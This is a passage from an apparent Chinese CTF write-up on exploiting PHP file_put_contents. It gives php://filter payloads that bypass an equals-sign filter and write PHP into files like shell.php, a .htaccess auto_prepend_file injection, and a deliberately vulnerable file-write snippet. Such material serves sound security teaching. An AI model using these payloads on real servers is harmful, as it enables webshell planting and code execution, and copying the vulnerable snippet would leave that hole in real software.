payload无法执行是因为受到了等号的影响，但是通过测试发现可以利用UTF-8和UTF-7间的转换了来绕过等号

[![](https://p4.ssl.qhimg.com/t018668ff1e7c0fab90.png)](https://p4.ssl.qhimg.com/t018668ff1e7c0fab90.png)

再进解码发现等号并没有转回来

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d8ac64eaa5f76c8e.png)

所以可以利用这种特性来嵌套过滤器，从而绕过等号

```
php://filter/write=PD9waHAgcGhwaW5mbygpOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=1.php
或
php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=Sn0w.php
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01df4953c97ddc3387.png)

经过测试发现，`write=`一定要写进去，如果不写PHP不会去自动识别，还有就是内容要写在前面，如果写在后面内容写会写入，但是解析不了，如：

```
php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=Sn0w.php
```

[![](https://p5.ssl.qhimg.com/t01af013f05a40185a9.png)](https://p5.ssl.qhimg.com/t01af013f05a40185a9.png)

**<a class="reference-link" name="UCS2/ROT13%E3%80%81UCS4/ROT13"></a>UCS2/ROT13、UCS4/ROT13**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t018ff83da74e24d9d3.png)

这里在自己测试的发现，使用UCS2或UCS4进行编码时，这个过程是识别空格的，但是到使用伪协议的时候需要进行反转解码，又无法识别空格，这就是为什么下面的payload要多加一个字符，可以自己测试一下就明白了。

```
php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=shell.php
#注意这里要补充一个字符，因为空格无法和任意一个字符搭配进行反转
```

[![](https://p1.ssl.qhimg.com/t018ae80391cf40878a.png)](https://p1.ssl.qhimg.com/t018ae80391cf40878a.png)

**UCS4/ROT13**

同样如此

```
php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|string.rot13|x?&lt;xx cucvcuc(bsa&gt;?;)/resource=6.php
```

### <a class="reference-link" name="%E7%AC%AC%E4%B8%89%E7%A7%8D%E6%83%85%E5%86%B5"></a>第三种情况

```
&lt;?php
if(isset($_GET['content']))`{`
    $filename = $_GET['filename'];
    $content = $_GET['content'];
    file_put_contents($filename,$content . "\nxxxxxx");
`}`else`{`
    highlight_file(__FILE__);
`}`
```

这种考点一般的话是禁止有特殊起始符和结束符号的语言，如果不禁，直接写入PHP代码就可以执行了，后面的限制也就没有什么意义了，这类问题往往是需要想办法处理掉杂糅代码的。

**<a class="reference-link" name=".htaccess%E7%BB%95%E8%BF%87"></a>.htaccess绕过**

使用.htaccess文件绕过需要注意该文件是很敏感的，如果有杂糅代码，便会出现错误，导致无法操作，可以使用注释符来将杂糅代码给注释掉

```
?filename=.htaccess&amp;content=php_value auto_prepend_file D:\flag.php%0a%23\
```

[![](https://p1.ssl.qhimg.com/t01db2c1b4d213f34a2.png)](https://p1.ssl.qhimg.com/t01db2c1b4d213f34a2.png)



## 参考博客：

[https://xz.aliyun.com/t/8163#toc-14](https://xz.aliyun.com/t/8163#toc-14)<br>[https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/](https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/)<br>[https://www.cnblogs.com/jpdoutop/p/httpd-htaccess.html](https://www.cnblogs.com/jpdoutop/p/httpd-htaccess.html)<br>[https://www.leavesongs.com/PENETRATION/php-filter-magic.html](https://www.leavesongs.com/PENETRATION/php-filter-magic.html)
